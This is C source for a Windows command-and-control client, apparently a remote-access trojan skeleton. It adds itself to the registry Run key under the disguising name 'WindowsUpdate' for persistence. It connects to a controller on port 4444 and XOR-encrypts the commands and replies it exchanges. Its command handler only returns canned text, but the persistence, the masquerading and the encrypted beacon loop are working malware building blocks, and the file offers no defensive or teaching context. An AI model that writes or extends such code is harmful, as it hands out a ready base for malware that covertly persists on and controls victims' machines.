#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h> // Winsock for networking
#include <windows.h>  // For persistence and Windows API

#pragma comment(lib, "ws2_32.lib") // Link Winsock library

#define SERVER_IP "127.0.0.1"
#define PORT 4444
#define XOR_KEY 0xAA // Simple XOR encryption key

void xor_encrypt_decrypt(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

void persist() {
    char path[MAX_PATH];
    HKEY hKey;

    if (GetModuleFileName(NULL, path, MAX_PATH)) {
        RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
        RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (const BYTE *)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

void execute_command(char *command, char *response) {
    if (strcmp(command, "systeminfo") == 0) {
        snprintf(response, 1024, "OS: Windows\nCPU: Intel\nMemory: 8GB");
    } else if (strcmp(command, "hello") == 0) {
        snprintf(response, 1024, "Hello from the client!");
    } else {
        snprintf(response, 1024, "Unknown command.");
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[1024], response[1024];

    persist(); // Add persistence to registry

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection failed. Error Code: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        if (recv(sock, buffer, sizeof(buffer), 0) < 0) {
            perror("Receive failed");
            break;
        }

        xor_encrypt_decrypt(buffer, strlen(buffer));

        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        printf("Command received: %s\n", buffer);
        memset(response, 0, sizeof(response));
        execute_command(buffer, response);

        xor_encrypt_decrypt(response, strlen(response));
        if (send(sock, response, strlen(response), 0) < 0) {
            perror("Send failed");
            break;
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
